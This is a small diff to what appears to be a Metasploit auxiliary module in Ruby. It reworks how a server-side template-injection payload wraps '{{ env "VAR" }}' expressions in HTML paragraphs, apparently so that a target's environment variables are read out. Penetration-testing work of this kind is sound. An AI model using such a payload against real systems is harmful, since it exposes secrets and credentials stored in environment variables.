@@ -268,10 +268,9 @@ class MetasploitModule < Msf::Auxiliary
 
     # Build payload with all environment variables
     payload_parts = env_vars.map do |var|
-      "#{var}: {{ env \"#{var}\" }}"
+      "<p>#{var}: {{ env \"#{var}\" }}</p>"
     end
-    payload_content = payload_parts.join('<br>')
-    payload = "<p>#{payload_content}</p>"
+    payload = payload_parts.join
 
     login
 
